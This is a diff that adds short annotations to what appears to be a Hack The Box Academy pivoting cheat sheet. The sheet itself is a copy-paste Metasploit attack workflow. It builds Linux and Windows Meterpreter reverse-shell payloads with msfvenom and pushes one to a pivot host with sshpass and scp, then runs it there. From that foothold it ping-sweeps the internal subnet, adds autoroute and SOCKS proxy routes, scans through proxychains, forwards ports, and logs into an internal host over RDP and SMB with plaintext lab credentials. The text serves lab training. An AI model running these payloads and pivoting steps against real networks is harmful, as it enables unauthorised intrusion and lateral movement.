@@ -31,11 +31,13 @@ msf6 exploit(multi/handler) > set LHOST 0.0.0.0
 msf6 exploit(multi/handler) > set LPORT 8080
 msf6 exploit(multi/handler) > run
 ```
+> Builds a Linux Meterpreter ELF and starts the matching handler; swap `LHOST`/`LPORT` and the output filename.
 
 ```bash
 # On pivot host — execute payload
 chmod +x backupjob && ./backupjob
 ```
+> Makes the payload executable and runs it on the pivot to open the session; swap the filename.
 
 Confirm session:
 
@@ -54,24 +56,28 @@ meterpreter > pwd
 ```bash
 meterpreter > run post/multi/gather/ping_sweep RHOSTS=172.16.5.0/23
 ```
+> Meterpreter ping-sweeps the internal subnet to find live hosts; swap the `RHOSTS` range.
 
 ### Option B — Bash one-liner (on pivot, Linux)
 
 ```bash
 for i in {1..254}; do (ping -c 1 172.16.5.$i | grep "bytes from" &); done
 ```
+> Bash ping sweep run on a Linux pivot to enumerate live internal hosts; swap the `172.16.5` subnet prefix.
 
 ### Option C — CMD one-liner (pivot is Windows)
 
 ```cmd
 for /L %i in (1 1 254) do ping 172.16.5.%i -n 1 -w 100 | find "Reply"
 ```
+> CMD ping sweep run on a Windows pivot to enumerate live internal hosts; swap the `172.16.5` subnet prefix.
 
 ### Option D — PowerShell sweep
 
 ```powershell
 1..254 | % {"172.16.5.$($_): $(Test-Connection -count 1 -comp 172.16.5.$($_) -quiet)"}
 ```
+> PowerShell ping sweep run on a Windows pivot to enumerate live internal hosts; swap the `172.16.5` subnet prefix.
 
 > Note: Run ping sweeps at least twice — ARP caches take time to build and early probes can silently drop.
 
@@ -89,6 +95,7 @@ msf6 post(multi/manage/autoroute) > set SESSION 1
 msf6 post(multi/manage/autoroute) > set SUBNET 172.16.5.0
 msf6 post(multi/manage/autoroute) > run
 ```
+> AutoRoute post-module adds a route to the internal subnet via the session; swap `SESSION` id and `SUBNET`.
 
 ```
 [+] Route added to subnet 10.129.0.0/255.255.0.0 from host's routing table.
@@ -100,6 +107,7 @@ msf6 post(multi/manage/autoroute) > run
 ```bash
 meterpreter > run autoroute -s 172.16.5.0/23
 ```
+> Adds the route directly from inside the Meterpreter session; swap the subnet/CIDR.
 
 > The `-p` flag lists active routes:
 
@@ -113,6 +121,7 @@ Active Routing Table
    10.129.0.0         255.255.0.0        Session 1
    172.16.5.0         255.255.254.0      Session 1
 ```
+> Lists the active Metasploit routing table to confirm the pivot route was added; run as-is.
 
 ---
 
@@ -127,6 +136,7 @@ msf6 auxiliary(server/socks_proxy) > run
 [*] Auxiliary module running as background job 0.
 [*] Starting the SOCKS proxy server
 ```
+> Starts Metasploit's SOCKS proxy on the chosen port routed through the session; swap `SRVPORT` and SOCKS `version`.
 
 Confirm it's running:
 
@@ -135,6 +145,7 @@ msf6 auxiliary(server/socks_proxy) > jobs
 # Id  Name                           Payload  Payload opts
 # 0   Auxiliary: server/socks_proxy
 ```
+> Lists Metasploit background jobs to confirm the SOCKS proxy is running; run as-is.
 
 ---
 
@@ -160,6 +171,7 @@ proxychains nmap 172.16.5.19 -p3389 -sT -v -Pn
 # |S-chain|-<>-127.0.0.1:9050-<><>-172.16.5.19:3389-<><>-OK
 # 3389/tcp open  ms-wbt-server
 ```
+> TCP-connect scans the internal target through the Metasploit SOCKS proxy; swap the target IP and ports.
 
 ---
 
@@ -177,6 +189,7 @@ meterpreter > help portfwd
 # -r   remote host to connect to
 # -R   reverse port forward flag
 ```
+> Shows the portfwd subcommand help/flags inside Meterpreter; run as-is.
 
 ### Forward port (attack box → internal target)
 
@@ -184,12 +197,14 @@ meterpreter > help portfwd
 meterpreter > portfwd add -l 3300 -p 3389 -r 172.16.5.19
 # [*] Local TCP relay created: :3300 <-> 172.16.5.19:3389
 ```
+> Forwards local port 3300 to the internal host's 3389 through the session; swap `-l` local port, `-p` remote port, `-r` target IP.
 
 Now `localhost:3300` on your attack box connects to `172.16.5.19:3389` through the pivot:
 
 ```bash
 xfreerdp /v:localhost:3300 /u:victor /p:pass@123
 ```
+> RDP to the internal host via the local portfwd relay; swap the local port and `/u:`/`/p:` credentials.
 
 Verify with netstat:
 
@@ -197,6 +212,7 @@ Verify with netstat:
 netstat -antp | grep 3300
 # tcp  0  0  127.0.0.1:54652  127.0.0.1:3300  ESTABLISHED  4075/xfreerdp
 ```
+> Confirms the local relay port has an established connection; swap the port `3300`.
 
 ### Reverse port forward (internal target → attack box)
 
@@ -219,6 +235,7 @@ msf6 exploit(multi/handler) > run
 # 3. Generate Windows payload pointing at the PIVOT (not your attack box)
 msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=172.16.5.129 LPORT=1234 -f exe -o backupscript.exe
 ```
+> Reverse portfwd: relay rule + Windows handler + payload pointed at the pivot's internal IP; swap `-l`/`-p` ports, `LHOST` (pivot IP), and `LPORT`.
 
 The Windows target connects to the pivot on `1234`, the pivot relays it to your attack box on `8081`, and you catch a Meterpreter session.
 
@@ -249,6 +266,7 @@ proxychains nmap 172.16.5.19 -p- -sT -Pn
 meterpreter > portfwd add -l 3300 -p 3389 -r 172.16.5.19
 xfreerdp /v:localhost:3300 /u:USER /p:PASS
 ```
+> Copy-paste Meterpreter pivot workflow: payload, ping sweep, autoroute, SOCKS, scan, single-port forward; swap `ATTACKER_IP`, subnet, target IP, ports, creds.
 
 ---
 
@@ -298,6 +316,7 @@ The pivot's `ens224` is `172.16.5.129/23`. The /23 network base is `172.16.4.0` 
 ```bash
 sshpass -p 'HTB_@cademy_stdnt!' ssh -o StrictHostKeyChecking=no ubuntu@10.129.91.231 'ip -br a && route -n'
 ```
+> Non-interactive SSH to dump the pivot's NICs and routes in one shot; swap the password and `ubuntu@IP`.
 
 **Step 1 — Generate Linux Meterpreter payload (set LHOST to your tun0 IP)**
 
@@ -306,12 +325,14 @@ LHOST=$(ip -br a | grep tun0 | awk '{print $3}' | cut -d/ -f1)
 msfvenom -p linux/x64/meterpreter/reverse_tcp LHOST=$LHOST LPORT=8080 -f elf -o /tmp/backupjob 2>/dev/null
 echo "[*] Payload written to /tmp/backupjob — LHOST=$LHOST"
 ```
+> Auto-detects your tun0 IP and builds the Linux Meterpreter payload with it; swap `LPORT` and the output path.
 
 **Step 2 — Deliver payload to pivot**
 
 ```bash
 sshpass -p 'HTB_@cademy_stdnt!' scp -o StrictHostKeyChecking=no /tmp/backupjob ubuntu@10.129.91.231:/tmp/backupjob
 ```
+> Copies the payload to the pivot non-interactively; swap the password, local/remote paths, and `ubuntu@IP`.
 
 **Step 3 — Start MSF handler (run this in msfconsole)**
 
@@ -328,6 +349,7 @@ run -j
 ```bash
 sshpass -p 'HTB_@cademy_stdnt!' ssh -o StrictHostKeyChecking=no ubuntu@10.129.91.231 'chmod +x /tmp/backupjob && /tmp/backupjob &'
 ```
+> Remotely makes the payload executable and runs it on the pivot to open the session; swap the password, `ubuntu@IP`, and payload path.
 
 **Step 5 — Ping sweep from Meterpreter session**
 
@@ -341,6 +363,7 @@ Or verify directly on the pivot:
 sshpass -p 'HTB_@cademy_stdnt!' ssh -o StrictHostKeyChecking=no ubuntu@10.129.91.231 \
   'for i in {1..254}; do (ping -c 1 172.16.5.$i | grep "bytes from" &); done; sleep 5'
 ```
+> Runs the bash ping sweep on the pivot over SSH to enumerate live internal hosts; swap the password, `ubuntu@IP`, and subnet prefix.
 
 **Step 6 — Add routes with AutoRoute**
 
@@ -372,6 +395,7 @@ msf6 auxiliary(server/socks_proxy) > run
 ```bash
 grep "socks" /etc/proxychains4.conf || echo "socks4  127.0.0.1 9050" | sudo tee -a /etc/proxychains4.conf
 ```
+> Ensures a SOCKS line exists in the Kali proxychains config, adding one if missing; swap the SOCKS version/port if needed.
 
 **Step 9 — Scan / interact through the tunnel**
 
@@ -385,6 +409,7 @@ proxychains4 xfreerdp /v:172.16.5.19 /u:victor /p:'pass@123' /cert:ignore /dynam
 # SMB (faster than RDP for file access)
 proxychains4 -q smbclient //172.16.5.19/C$ -U 'victor%pass@123' -c 'ls Users\victor\Desktop\'
 ```
+> Scans, RDPs, and SMBs into the internal target through the SOCKS tunnel; swap the target IP and `victor%pass@123` credentials.
 
 ### Lessons Learned
 
